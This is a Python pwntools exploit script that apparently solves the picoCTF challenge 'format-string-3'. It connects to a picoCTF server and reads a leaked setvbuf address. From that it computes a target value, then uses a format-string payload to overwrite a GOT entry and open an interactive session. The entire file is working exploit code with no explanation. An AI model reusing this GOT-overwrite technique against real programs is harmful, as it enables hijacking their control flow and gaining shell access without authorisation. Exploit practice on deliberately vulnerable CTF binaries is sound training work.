from pwn import *

exe = context.binary = ELF('./format-string-3', checksec=False)
target_addr = 0x404018
value_to_write = 0x60440

conn = remote('rhea.picoctf.net', 63152)

# Calculate argument offset
def find_offset():
   payload=b"AAAA"
   payload += b'%p.' * 38
   print(conn.recvline())
   print(conn.recvline())
   conn.sendline(payload)
   print(conn.recvline())

def get_address(line):
   tokens=line.split()
   address=tokens[-1]
   return int(address,16)

def send_payload():
   global value_to_write
   
   offset = 38
   print(conn.recvline())
   line=conn.recvline()
   get_address(line)

   setvbuf_addr=get_address(line)
   value_to_write+=setvbuf_addr
   print(hex(value_to_write))
   payload = fmtstr_payload(offset, {target_addr: value_to_write},write_size='byte')
   print(payload)
   
   conn.sendline(payload)
   conn.interactive()
   

send_payload()
# find_offset()